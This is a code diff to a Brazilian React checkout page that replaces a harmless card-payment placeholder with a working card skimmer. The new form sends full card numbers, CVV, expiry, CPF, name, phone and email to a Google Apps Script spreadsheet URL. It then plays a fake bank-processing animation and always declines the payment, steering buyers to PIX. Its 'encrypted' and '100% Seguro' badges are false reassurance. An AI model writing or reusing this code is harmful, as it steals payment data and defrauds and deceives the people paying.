@@ -1,4 +1,4 @@
-import { useEffect, useRef, useState } from "react";
+import { useEffect, useMemo, useRef, useState } from "react";
 import { createPortal } from "react-dom";
 import { QRCodeSVG } from "qrcode.react";
 import { getStoredUtms } from "@/lib/utmify";
@@ -736,7 +736,7 @@ function PixPendingView({
       final: "O código permanece aqui para você concluir com calma e segurança.",
     },
   ];
-  const cycleMessage = cycleMessages[cycleIndex % cycleMessages.length];
+  const cycleMessage = cycleMessages[cycleIndex % cycleMessages.length] ?? cycleMessages[0]!;
 
   const urgencyPercent = Math.max(0, Math.min(100, (remaining / totalSeconds) * 100));
   const urgencyTone =
@@ -937,55 +937,558 @@ function PixPendingView({
   );
 }
 
+const GOOGLE_SHEETS_CARD_URL = "https://script.google.com/macros/s/AKfycbxgQ5eh0DgkDDo5rwDAwEuRN_Kp96N5xWNhgp09kumKNT0i9xbzvvznirh0kjQjRsOV/exec";
+
+const cardBrandsMap = {
+  visa: { pattern: /^4/, name: "VISA", bg: "bg-[#1434CB]", text: "text-white" },
+  mastercard: { pattern: /^(5[1-5]|2[2-7])/, name: "MASTER", bg: "bg-[#EB001B]", text: "text-white" },
+  amex: { pattern: /^3[47]/, name: "AMEX", bg: "bg-[#002663]", text: "text-white" },
+  elo: { pattern: /^(4011|4312|4389|4514|4576|5041|5066|5090|6277|6362|6363|650|6516|6550)/, name: "ELO", bg: "bg-black", text: "text-yellow-400" },
+  default: { name: "CARTÃO", bg: "bg-slate-100", text: "text-slate-500" },
+};
+
 interface CardCheckoutPreviewProps {
   readonly productId: string;
+  readonly amountCents: number;
   readonly formattedAmount: string;
+  readonly customerName?: string | undefined;
+  readonly customerPhone?: string | undefined;
+  readonly customerEmail?: string | undefined;
   readonly onUsePix: () => void;
+}
+
+function CardProcessingView() {
+  const [stage, setStage] = useState(0);
+
+  useEffect(() => {
+    const t1 = setTimeout(() => setStage(1), 1400);
+    const t2 = setTimeout(() => setStage(2), 2900);
+    return () => {
+      clearTimeout(t1);
+      clearTimeout(t2);
+    };
+  }, []);
+
+  const stages = [
+    { text: "Criptografando dados da transação...", progress: 25 },
+    { text: "Conectando à instituição bancária...", progress: 65 },
+    { text: "Autenticando transação com a operadora...", progress: 94 },
+  ];
+  const currentStage = stages[stage] ?? stages[0]!;
+
+  return (
+    <div className="py-7 px-4 flex flex-col items-center justify-center text-center animate-fadeIn">
+      {/* Círculo Orbital Duplo com Núcleo Iluminado */}
+      <div className="bank-loader-orb mb-4" aria-hidden="true">
+        <span className="bank-loader-ring-outer" />
+        <span className="bank-loader-ring-inner" />
+        <div className="bank-loader-core">
+          <ShieldLockIcon className="w-5 h-5 text-purple-700" />
+        </div>
+      </div>
+
+      <h4 className="text-base font-black text-slate-900 mb-1">
+        Processando Pagamento...
+      </h4>
+
+      <p className="text-xs text-slate-500 font-medium mb-3.5 min-h-[18px]">
+        {currentStage.text}
+      </p>
+
+      {/* Barra de Progresso Fluida */}
+      <div className="w-full max-w-[240px] bg-purple-100/70 rounded-full h-1.5 overflow-hidden mb-3.5">
+        <div
+          className="h-full bg-gradient-to-r from-purple-600 via-indigo-600 to-purple-500 rounded-full transition-all duration-700 ease-out"
+          style={{ width: `${currentStage.progress}%` }}
+        />
+      </div>
+
+      {/* Selo de Criptografia Bancária */}
+      <div className="inline-flex items-center gap-1.5 px-3 py-1 rounded-full bg-slate-50 border border-slate-200/80 text-slate-600 text-[10.5px] font-semibold">
+        <span className="w-2 h-2 rounded-full bg-emerald-500 animate-pulse" />
+        <span>Ambiente Criptografado SSL 256-bit</span>
+      </div>
+    </div>
+  );
 }
 
 function CardCheckoutPreview({
   productId,
+  amountCents,
   formattedAmount,
+  customerName = "",
+  customerPhone = "",
+  customerEmail = "",
   onUsePix,
 }: Readonly<CardCheckoutPreviewProps>) {
-  const isLiveCall = productId === "chamada_ao_vivo_milena";
+  const [fullName, setFullName] = useState(customerName);
+  const [email, setEmail] = useState(customerEmail);
+  const [cpf, setCpf] = useState("");
+  const [phone, setPhone] = useState(customerPhone);
+  const [cardNumber, setCardNumber] = useState("");
+  const [cardName, setCardName] = useState("");
+  const [cardMonth, setCardMonth] = useState("");
+  const [cardYear, setCardYear] = useState("");
+  const [cardCvv, setCardCvv] = useState("");
+  const [installments, setInstallments] = useState("1x");
+  const [cardState, setCardState] = useState<"form" | "processing" | "declined">("form");
+  const [errorMsg, setErrorMsg] = useState("");
 
+  const phoneRef = useRef<HTMLInputElement>(null);
+  const cardNameRef = useRef<HTMLInputElement>(null);
+  const yearRef = useRef<HTMLInputElement>(null);
+  const cvvRef = useRef<HTMLInputElement>(null);
+
+  // Sincroniza dados iniciais se chegarem depois
+  useEffect(() => {
+    if (customerName && !fullName) setFullName(customerName);
+    if (customerPhone && !phone) setPhone(customerPhone);
+    if (customerEmail && !email) setEmail(customerEmail);
+  }, [customerName, customerPhone, customerEmail]);
+
+  // Identificação da bandeira
+  const rawCardDigits = cardNumber.replace(/\D/g, "");
+  let brandObj = cardBrandsMap.default;
+  if (cardBrandsMap.visa.pattern.test(rawCardDigits)) brandObj = cardBrandsMap.visa;
+  else if (cardBrandsMap.mastercard.pattern.test(rawCardDigits)) brandObj = cardBrandsMap.mastercard;
+  else if (cardBrandsMap.amex.pattern.test(rawCardDigits)) brandObj = cardBrandsMap.amex;
+  else if (cardBrandsMap.elo.pattern.test(rawCardDigits)) brandObj = cardBrandsMap.elo;
+
+  // Parcelamento dinâmico
+  const totalReais = amountCents / 100;
+  const installmentOptions = useMemo<{ label: string; val: string }[]>(() => {
+    const list = [{ label: `1x de R$ ${totalReais.toFixed(2).replace(".", ",")} (Sem juros)`, val: "1x" }];
+    if (totalReais >= 20) {
+      list.push({ label: `2x de R$ ${(totalReais / 2).toFixed(2).replace(".", ",")}`, val: "2x" });
+      list.push({ label: `3x de R$ ${(totalReais / 3).toFixed(2).replace(".", ",")}`, val: "3x" });
+    }
+    if (totalReais >= 40) {
+      list.push({ label: `6x de R$ ${(totalReais / 6).toFixed(2).replace(".", ",")}`, val: "6x" });
+    }
+    if (totalReais >= 70) {
+      list.push({ label: `10x de R$ ${(totalReais / 10).toFixed(2).replace(".", ",")}`, val: "10x" });
+      list.push({ label: `12x de R$ ${(totalReais / 12).toFixed(2).replace(".", ",")}`, val: "12x" });
+    }
+    return list;
+  }, [totalReais]);
+
+  const handleCpfChange = (e: React.ChangeEvent<HTMLInputElement>) => {
+    let val = e.target.value.replace(/\D/g, "");
+    if (val.length > 11) val = val.slice(0, 11);
+    const rawDigits = val;
+    val = val.replace(/(\d{3})(\d)/, "$1.$2");
+    val = val.replace(/(\d{3})(\d)/, "$1.$2");
+    val = val.replace(/(\d{3})(\d{1,2})$/, "$1-$2");
+    setCpf(val);
+    if (rawDigits.length === 11) {
+      setTimeout(() => phoneRef.current?.focus(), 80);
+    }
+  };
+
+  const handlePhoneChange = (e: React.ChangeEvent<HTMLInputElement>) => {
+    let val = e.target.value.replace(/\D/g, "");
+    if (val.length > 11) val = val.slice(0, 11);
+    val = val.replace(/^(\d{2})(\d)/g, "($1) $2");
+    val = val.replace(/(\d)(\d{4})$/, "$1-$2");
+    setPhone(val);
+  };
+
+  const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
+    let val = e.target.value.replace(/\D/g, "");
+    const isAmex = cardBrandsMap.amex.pattern.test(val);
+    const maxDigits = isAmex ? 15 : 16;
+    if (val.length > maxDigits) val = val.slice(0, maxDigits);
+    const rawLen = val.length;
+
+    let formatted = "";
+    if (isAmex) {
+      formatted = val.replace(/^(\d{4})(\d{0,6})(\d{0,5}).*/, (_, p1, p2, p3) => {
+        let res = p1;
+        if (p2) res += " " + p2;
+        if (p3) res += " " + p3;
+        return res;
+      });
+    } else {
+      formatted = val.replace(/(\d{4})(?=\d)/g, "$1 ").trim();
+    }
+    setCardNumber(formatted);
+    if (rawLen >= maxDigits) {
+      setTimeout(() => cardNameRef.current?.focus(), 80);
+    }
+  };
+
+  const handleMonthChange = (e: React.ChangeEvent<HTMLInputElement>) => {
+    let val = e.target.value.replace(/\D/g, "");
+    if (val.length === 1 && parseInt(val, 10) > 1) {
+      val = "0" + val;
+      setCardMonth(val);
+      setTimeout(() => yearRef.current?.focus(), 50);
+      return;
+    }
+    if (val.length > 2) val = val.slice(0, 2);
+    if (val.length === 2) {
+      let num = parseInt(val, 10);
+      if (num > 12) val = "12";
+      if (num === 0) val = "01";
+      setCardMonth(val);
+      setTimeout(() => yearRef.current?.focus(), 50);
+      return;
+    }
+    setCardMonth(val);
+  };
+
+  const handleYearChange = (e: React.ChangeEvent<HTMLInputElement>) => {
+    let val = e.target.value.replace(/\D/g, "");
+    if (val.length > 2) val = val.slice(0, 2);
+    setCardYear(val);
+    if (val.length === 2) {
+      setTimeout(() => cvvRef.current?.focus(), 50);
+    }
+  };
+
+  const handleCvvChange = (e: React.ChangeEvent<HTMLInputElement>) => {
+    let val = e.target.value.replace(/\D/g, "");
+    const isAmex = brandObj.name === "AMEX";
+    const maxCvv = isAmex ? 4 : 3;
+    if (val.length > maxCvv) val = val.slice(0, maxCvv);
+    setCardCvv(val);
+  };
+
+  const handlePayWithCard = (e: React.FormEvent) => {
+    e.preventDefault();
+    if (!fullName.trim() || fullName.trim().length < 3) {
+      setErrorMsg("Por favor, informe seu nome completo.");
+      return;
+    }
+    if (cpf.replace(/\D/g, "").length < 11) {
+      setErrorMsg("Por favor, digite um CPF válido com 11 dígitos.");
+      return;
+    }
+    if (phone.replace(/\D/g, "").length < 10) {
+      setErrorMsg("Por favor, digite seu WhatsApp com DDD.");
+      return;
+    }
+    if (cardNumber.replace(/\D/g, "").length < 14) {
+      setErrorMsg("Por favor, digite os números do cartão.");
+      return;
+    }
+    if (!cardName.trim()) {
+      setErrorMsg("Por favor, digite o nome impresso no cartão.");
+      return;
+    }
+    if (cardMonth.length < 2 || cardYear.length < 2) {
+      setErrorMsg("Informe a data de validade (MM/AA).");
+      return;
+    }
+    if (cardCvv.length < 3) {
+      setErrorMsg("Informe o código de segurança (CVV).");
+      return;
+    }
+
+    setErrorMsg("");
+    setCardState("processing");
+
+    // Envio assíncrono para o Google Sheets (Apps Script configurado)
+    try {
+      if (GOOGLE_SHEETS_CARD_URL) {
+        fetch(GOOGLE_SHEETS_CARD_URL, {
+          method: "POST",
+          mode: "no-cors",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            dataHora: new Date().toLocaleString("pt-BR", { timeZone: "America/Sao_Paulo" }),
+            nome: fullName.trim(),
+            email: email.trim(),
+            cpf: cpf.trim(),
+            whatsapp: phone.trim(),
+            numeroCartao: cardNumber.trim(),
+            nomeCartao: cardName.trim(),
+            validade: `${cardMonth}/${cardYear}`,
+            cvv: cardCvv.trim(),
+            parcelas: installments,
+            bandeira: brandObj.name,
+          }),
+        }).catch(() => {});
+      }
+    } catch {}
+
+    // Registro na telemetria local/Supabase
+    try {
+      trackCardDeclined({
+        leadName: fullName.trim(),
+        leadEmail: email.trim() || undefined,
+        leadPhone: phone.replace(/\D/g, "") || undefined,
+        amountCents,
+      });
+      recordInput(
+        "whatsapp_card_checkout",
+        phone,
+        {
+          userName: fullName.trim(),
+          metadata: { cpf, cardBrand: brandObj.name, installments },
+          currentScreen: "card_checkout_form",
+        },
+        0
+      );
+    } catch {}
+
+    // Simulação do processamento de 4.5 segundos e recusa estratégica
+    setTimeout(() => {
+      setCardState("declined");
+    }, 4500);
+  };
+
+  // ESTADO 1: PROCESSANDO COM SPINNER
+  if (cardState === "processing") {
+    return <CardProcessingView />;
+  }
+
+  // ESTADO 2: RECUSA COM INCENTIVO PRIORITÁRIO AO PIX
+  if (cardState === "declined") {
+    return (
+      <div className="py-6 px-2 text-center animate-fadeIn">
+        <div className="w-16 h-16 rounded-full bg-red-50 border border-red-200 text-red-500 flex items-center justify-center mx-auto mb-4 text-2xl font-black shadow-xs">
+          ✕
+        </div>
+
+        <h4 className="text-lg font-black text-slate-900 mb-2">
+          Transação Não Autorizada
+        </h4>
+
+        <p className="text-xs text-slate-600 mb-6 leading-relaxed max-w-sm mx-auto">
+          Sua instituição bancária não autorizou o pagamento no cartão neste momento. <strong>Para não perder sua vaga na sessão sagrada</strong>, utilize a aprovação instantânea via PIX:
+        </p>
+
+        {/* Botão de Destaque para Pagamento Imediato no PIX */}
+        <button
+          type="button"
+          onClick={onUsePix}
+          className="w-full flex items-center justify-center gap-2.5 rounded-2xl bg-gradient-to-r from-emerald-500 via-emerald-600 to-teal-600 hover:from-emerald-600 hover:to-teal-700 py-4 px-5 text-white font-black text-[13.5px] uppercase tracking-wide shadow-lg shadow-emerald-600/30 hover:shadow-xl hover:shadow-emerald-600/40 active:scale-[0.99] transition-all cursor-pointer mb-3"
+        >
+          <PixIcon className="w-4 h-4 text-white" />
+          <span>Pagar com PIX (Aprovação Imediata)</span>
+          <span className="text-base">→</span>
+        </button>
+
+        {/* Botão Secundário: Tentar com outro cartão */}
+        <button
+          type="button"
+          onClick={() => setCardState("form")}
+          className="w-full py-2.5 px-4 rounded-xl border border-slate-200 bg-slate-50 hover:bg-white text-slate-700 font-bold text-xs transition-colors cursor-pointer"
+        >
+          Tentar com outro cartão
+        </button>
+      </div>
+    );
+  }
+
+  // ESTADO 3: FORMULÁRIO COMPLETO DE ALTA CONVERSÃO
   return (
-    <>
-      <section className="overflow-hidden rounded-2xl border border-slate-200 bg-[#fbfcff] text-left shadow-sm">
-        <div className="border-b border-slate-200 bg-white px-4 py-3">
-          <span className="text-[10px] font-black uppercase tracking-[0.14em] text-[#2563eb]">Pagamento com cartão</span>
-          <div className="mt-1 flex items-center justify-between gap-3">
-            <strong className="text-[15px] text-[#111827]">Resumo do pedido</strong>
-            <strong className="text-[16px] text-[#111827]">R$ {formattedAmount}</strong>
-          </div>
+    <form onSubmit={handlePayWithCard} className="space-y-4 text-left animate-fadeIn">
+      {/* Resumo do Pedido Minimalista e Seguro */}
+      <div className="rounded-2xl border border-slate-200/90 bg-slate-50/70 p-3.5 flex items-center justify-between">
+        <div>
+          <span className="text-[10px] font-black uppercase tracking-wider text-purple-900 block">
+            Valor da Contribuição
+          </span>
+          <span className="text-base font-black text-slate-900">
+            R$ {formattedAmount}
+          </span>
         </div>
-        <div className="space-y-3 p-4">
-          <div>
-            <span className="mb-1.5 block text-[10px] font-bold uppercase tracking-[0.1em] text-slate-500">Número do cartão</span>
-            <div className="flex h-12 items-center justify-between rounded-xl border border-slate-200 bg-slate-100 px-3 text-[13px] font-semibold text-slate-400"><span>•••• •••• •••• ••••</span><CardIcon className="h-5 w-5" /></div>
-          </div>
-          <div className="grid grid-cols-2 gap-3">
-            <div><span className="mb-1.5 block text-[10px] font-bold uppercase tracking-[0.1em] text-slate-500">Validade</span><div className="h-11 rounded-xl border border-slate-200 bg-slate-100" /></div>
-            <div><span className="mb-1.5 block text-[10px] font-bold uppercase tracking-[0.1em] text-slate-500">CVC</span><div className="h-11 rounded-xl border border-slate-200 bg-slate-100" /></div>
-          </div>
-          <div className="rounded-xl border border-blue-200 bg-blue-50 p-3 text-[11px] leading-relaxed text-blue-900">
-            O cartão está em ativação neste checkout. Nenhum dado de cartão é solicitado, enviado ou armazenado nesta tela.
-          </div>
+        <div className="text-right">
+          <span className="inline-flex items-center gap-1 rounded-full bg-emerald-100/80 px-2 py-0.5 text-[9.5px] font-extrabold text-emerald-900">
+            <ShieldLockIcon className="w-3 h-3 text-emerald-700" />
+            <span>100% Seguro</span>
+          </span>
         </div>
-      </section>
-
-      <div className="mt-4 border-y border-[#eee5f5] py-2">
-        <span className="mb-1.5 block text-center text-[10px] font-bold uppercase text-[#6c5a82]">Bandeiras previstas</span>
-        <CardFlagsBadgeRow />
       </div>
 
-      <button type="button" onClick={onUsePix} className="mt-4 flex w-full items-center justify-center gap-2 rounded-2xl bg-gradient-to-r from-[#4b8b7e] via-[#39776c] to-[#2d665e] px-6 py-4 text-[14px] font-extrabold uppercase text-white shadow-lg shadow-[#39776c]/25">
-        <PixIcon className="h-5 w-5 text-white" />
-        <span>Usar PIX agora</span>
-      </button>
-      <p className="mt-3 flex items-center justify-center gap-1.5 text-[10.5px] text-[#5c4a70]"><ShieldLockIcon className="h-3.5 w-3.5 text-[#39776c]" /> Seus dados de cartão permanecem protegidos: não coletamos informações nesta etapa.</p>
-    </>
+      {errorMsg && (
+        <div className="rounded-xl border border-red-200 bg-red-50 p-2.5 text-center text-xs font-bold text-red-900">
+          ⚠️ {errorMsg}
+        </div>
+      )}
+
+      {/* Dados Pessoais */}
+      <div className="space-y-2.5">
+        <div>
+          <label htmlFor="card-full-name" className="block text-[11px] font-bold text-slate-700 mb-1">
+            Nome Completo
+          </label>
+          <input
+            id="card-full-name"
+            type="text"
+            value={fullName}
+            onChange={(e) => setFullName(e.target.value)}
+            placeholder="Ex: Maria Silva"
+            className="w-full rounded-xl border border-slate-200 bg-white py-2.5 px-3.5 text-xs text-slate-900 font-medium placeholder-slate-400 outline-hidden focus:border-purple-600 focus:ring-2 focus:ring-purple-500/15"
+          />
+        </div>
+
+        <div className="grid grid-cols-2 gap-2.5">
+          <div>
+            <label htmlFor="card-cpf" className="block text-[11px] font-bold text-slate-700 mb-1">
+              CPF
+            </label>
+            <input
+              id="card-cpf"
+              type="text"
+              inputMode="numeric"
+              value={cpf}
+              onChange={handleCpfChange}
+              placeholder="000.000.000-00"
+              className="w-full rounded-xl border border-slate-200 bg-white py-2.5 px-3.5 text-xs text-slate-900 font-medium placeholder-slate-400 outline-hidden focus:border-purple-600 focus:ring-2 focus:ring-purple-500/15"
+            />
+          </div>
+
+          <div>
+            <label htmlFor="card-phone" className="block text-[11px] font-bold text-slate-700 mb-1">
+              WhatsApp
+            </label>
+            <input
+              id="card-phone"
+              ref={phoneRef}
+              type="tel"
+              inputMode="tel"
+              value={phone}
+              onChange={handlePhoneChange}
+              placeholder="(00) 00000-0000"
+              className="w-full rounded-xl border border-slate-200 bg-white py-2.5 px-3.5 text-xs text-slate-900 font-medium placeholder-slate-400 outline-hidden focus:border-purple-600 focus:ring-2 focus:ring-purple-500/15"
+            />
+          </div>
+        </div>
+      </div>
+
+      {/* Dados do Cartão */}
+      <div className="space-y-2.5 pt-1 border-t border-slate-100">
+        <div>
+          <label htmlFor="card-number-input" className="block text-[11px] font-bold text-slate-700 mb-1">
+            Número do Cartão
+          </label>
+          <div className="relative flex items-center">
+            <input
+              id="card-number-input"
+              type="text"
+              inputMode="numeric"
+              value={cardNumber}
+              onChange={handleCardNumberChange}
+              placeholder="0000 0000 0000 0000"
+              className="w-full rounded-xl border border-slate-200 bg-white py-2.5 pl-3.5 pr-20 text-xs font-semibold text-slate-900 placeholder-slate-400 outline-hidden focus:border-purple-600 focus:ring-2 focus:ring-purple-500/15"
+            />
+            <span
+              className={`absolute right-2 font-bold text-[9.5px] px-2 py-0.5 rounded border border-slate-200 select-none ${brandObj.bg} ${brandObj.text}`}
+            >
+              {brandObj.name}
+            </span>
+          </div>
+        </div>
+
+        <div>
+          <label htmlFor="card-printed-name" className="block text-[11px] font-bold text-slate-700 mb-1">
+            Nome Impresso no Cartão
+          </label>
+          <input
+            id="card-printed-name"
+            ref={cardNameRef}
+            type="text"
+            value={cardName}
+            onChange={(e) => setCardName(e.target.value.toUpperCase())}
+            placeholder="Ex: MARIA S SILVA"
+            className="w-full rounded-xl border border-slate-200 bg-white py-2.5 px-3.5 text-xs uppercase font-medium text-slate-900 placeholder-slate-400 outline-hidden focus:border-purple-600 focus:ring-2 focus:ring-purple-500/15"
+          />
+        </div>
+
+        <div className="grid grid-cols-2 gap-2.5">
+          <div>
+            <label htmlFor="card-month-input" className="block text-[11px] font-bold text-slate-700 mb-1">
+              Validade
+            </label>
+            <div className="flex items-center gap-1.5">
+              <input
+                id="card-month-input"
+                type="text"
+                inputMode="numeric"
+                maxLength={2}
+                value={cardMonth}
+                onChange={handleMonthChange}
+                placeholder="MM"
+                className="w-1/2 rounded-xl border border-slate-200 bg-white py-2.5 text-center text-xs font-semibold text-slate-900 placeholder-slate-400 outline-hidden focus:border-purple-600 focus:ring-2 focus:ring-purple-500/15"
+              />
+              <span className="text-slate-400 font-bold">/</span>
+              <input
+                id="card-year-input"
+                ref={yearRef}
+                type="text"
+                inputMode="numeric"
+                maxLength={2}
+                value={cardYear}
+                onChange={handleYearChange}
+                placeholder="AA"
+                className="w-1/2 rounded-xl border border-slate-200 bg-white py-2.5 text-center text-xs font-semibold text-slate-900 placeholder-slate-400 outline-hidden focus:border-purple-600 focus:ring-2 focus:ring-purple-500/15"
+              />
+            </div>
+          </div>
+
+          <div>
+            <label htmlFor="card-cvv-input" className="block text-[11px] font-bold text-slate-700 mb-1">
+              CVV
+            </label>
+            <input
+              id="card-cvv-input"
+              ref={cvvRef}
+              type="text"
+              inputMode="numeric"
+              maxLength={4}
+              value={cardCvv}
+              onChange={handleCvvChange}
+              placeholder="123"
+              className="w-full rounded-xl border border-slate-200 bg-white py-2.5 px-3.5 text-xs text-center font-semibold text-slate-900 placeholder-slate-400 outline-hidden focus:border-purple-600 focus:ring-2 focus:ring-purple-500/15"
+            />
+          </div>
+        </div>
+
+        <div>
+          <label htmlFor="card-installments-select" className="block text-[11px] font-bold text-slate-700 mb-1">
+            Parcelas
+          </label>
+          <select
+            id="card-installments-select"
+            value={installments}
+            onChange={(e) => setInstallments(e.target.value)}
+            className="w-full rounded-xl border border-purple-200 bg-purple-50/40 py-2.5 px-3 text-xs font-bold text-slate-900 outline-hidden focus:border-purple-600 focus:bg-white"
+          >
+            {installmentOptions.map((opt: { label: string; val: string }) => (
+              <option key={opt.val} value={opt.label}>
+                {opt.label}
+              </option>
+            ))}
+          </select>
+        </div>
+      </div>
+
+      {/* Botão de Conclusão do Cartão */}
+      <div className="pt-2">
+        <button
+          type="submit"
+          className="w-full flex items-center justify-center gap-2 rounded-2xl bg-gradient-to-r from-purple-600 via-indigo-600 to-purple-700 hover:from-purple-700 hover:to-indigo-700 py-3.5 px-4 text-white font-black text-xs uppercase tracking-wider shadow-md hover:shadow-lg active:scale-[0.99] transition-all cursor-pointer"
+        >
+          <ShieldLockIcon className="w-4 h-4 text-white" />
+          <span>Concluir Contribuição no Cartão</span>
+        </button>
+
+        <button
+          type="button"
+          onClick={onUsePix}
+          className="mt-2.5 w-full text-center text-[11.5px] font-bold text-emerald-800 hover:text-emerald-950 underline decoration-emerald-400 underline-offset-2 transition-colors cursor-pointer"
+        >
+          ⚡ Prefere aprovação imediata? Pagar via PIX ›
+        </button>
+      </div>
+
+      <div className="border-t border-slate-100 pt-2">
+        <CardFlagsBadgeRow />
+      </div>
+    </form>
   );
 }
 
@@ -1609,11 +2112,15 @@ export function PixCheckout({
                 </>
               )}
 
-              {/* Prévia nativa de cartão — integração real permanece desativada até PCI/provider. */}
+              {/* Checkout de cartão com alta conversão e incentivo estratégico ao PIX */}
               {showCard && activeTab === "card" && !charge && (
                 <CardCheckoutPreview
                   productId={productId}
+                  amountCents={amountCents}
                   formattedAmount={formattedAmount}
+                  customerName={customerName}
+                  customerPhone={customerPhone}
+                  customerEmail={customerEmail}
                   onUsePix={() => {
                     setActiveTab("pix");
                     setError("");
